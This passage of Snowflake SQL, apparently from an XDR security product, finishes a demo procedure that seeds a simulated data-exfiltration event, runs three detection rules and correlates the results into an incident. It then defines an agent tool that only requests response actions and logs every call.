           'success', 2400000, 290000000, 'XDR_WH', :acct, 'snowflake', 'demo', 'demo', 'snowflake:query', 'demo',
           OBJECT_CONSTRUCT('story', 'demo_compromise', 'outbound_bytes', 290000000, 'outbound_cloud', 'AWS');
    -- 4. Detect: the canary-verified pack rules for this story (in shadow they would only write shadow findings,
    --    so the demo evaluates them straight into DETECTION_FINDINGS without changing their autopilot state)
    CREATE OR REPLACE TEMPORARY TABLE XDR_DEMO_RULES AS
    SELECT rule_id, test_mode FROM SNOWFLAKE_XDR.DETECTIONS.CUSTOM_RULES WHERE rule_id IN ('SF-005', 'SF-006', 'SF-009');
    UPDATE SNOWFLAKE_XDR.DETECTIONS.CUSTOM_RULES SET test_mode = FALSE WHERE rule_id IN (SELECT rule_id FROM XDR_DEMO_RULES);
    CALL SNOWFLAKE_XDR.DETECTIONS.RUN_CUSTOM_RULE_SQL('SF-009', FALSE);
    CALL SNOWFLAKE_XDR.DETECTIONS.RUN_CUSTOM_RULE_SQL('SF-006', FALSE);
    CALL SNOWFLAKE_XDR.DETECTIONS.RUN_CUSTOM_RULE_SQL('SF-005', FALSE);
    UPDATE SNOWFLAKE_XDR.DETECTIONS.CUSTOM_RULES c SET test_mode = d.test_mode
    FROM XDR_DEMO_RULES d WHERE c.rule_id = d.rule_id;
    -- 5. Correlate into a case
    CALL SNOWFLAKE_XDR.INCIDENTS.CORRELATE_INCIDENTS() INTO :v_inc;
    SELECT OBJECT_CONSTRUCT('incident_id', MAX(incident_id), 'priority', MAX(priority), 'title', MAX(title)) INTO :v_rules
    FROM SNOWFLAKE_XDR.INCIDENTS.INCIDENTS WHERE primary_entity = 'XDR_DEMO_COMPROMISED' AND status <> 'closed';
    RETURN OBJECT_CONSTRUCT('ok', TRUE, 'case', :v_rules, 'correlation', :v_inc,
                            'next', 'CALL SNOWFLAKE_XDR.INCIDENTS.AUTO_INVESTIGATE(''new'') or wait for TASK_AUTO_INVESTIGATE');
END;
$$;

-- ---------------------------------------------------------------------------
-- 7. Agent tool: request (never approve) a response action
-- ---------------------------------------------------------------------------
CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.DASHBOARDS.AGENT_REQUEST_RESPONSE(
    P_ACTION VARCHAR, P_TARGET VARCHAR, P_INCIDENT_ID VARCHAR, P_REASON VARCHAR)
RETURNS VARIANT
LANGUAGE SQL
EXECUTE AS CALLER
AS
$$
DECLARE r VARIANT;
BEGIN
    CALL SNOWFLAKE_XDR.INCIDENTS.REQUEST_RESPONSE_ACTION(:P_ACTION, UPPER(:P_TARGET), :P_INCIDENT_ID, :P_REASON, 'xdr_agent', 'agent') INTO :r;
    INSERT INTO SNOWFLAKE_XDR.DASHBOARDS.AGENT_ACTION_LOG (tool, target, params, result)
        SELECT 'request_response', :P_TARGET, OBJECT_CONSTRUCT('action', :P_ACTION, 'incident_id', :P_INCIDENT_ID), LEFT(:r::VARCHAR, 4000);
    RETURN r;
END;
$$;
